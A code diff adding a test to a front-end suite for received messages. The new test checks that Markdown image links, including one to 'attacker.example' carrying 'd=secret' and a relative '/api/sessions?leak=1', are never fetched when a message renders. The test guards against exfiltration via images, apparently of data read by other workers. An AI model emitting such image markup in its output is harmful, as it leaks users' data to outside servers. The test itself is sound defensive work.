@@ -66,4 +66,16 @@ describe("a received message's text", () => {
     expect(textOf().querySelector("b")).toBeNull();
     expect(textOf().textContent).toContain("<b>loud</b>");
   });
+
+  // An image in Markdown is fetched the moment the message is drawn, before anyone
+  // clicks: its address could carry what another worker read to a server it names.
+  it("never fetches an image the text names, remote or relative", () => {
+    const text = "![chart](https://attacker.example/c?d=secret) and ![x](/api/sessions?leak=1)";
+    render(<ReceivedMessage item={received({ text })} />);
+    const sources = [...document.querySelectorAll("img")].map((img) => img.getAttribute("src"));
+    expect(sources.some((src) => src?.includes("attacker.example"))).toBe(false);
+    expect(sources.some((src) => src?.includes("/api/sessions"))).toBe(false);
+    // Each image is still named, by its alt text.
+    expect(textOf().textContent).toContain("chart");
+  });
 });
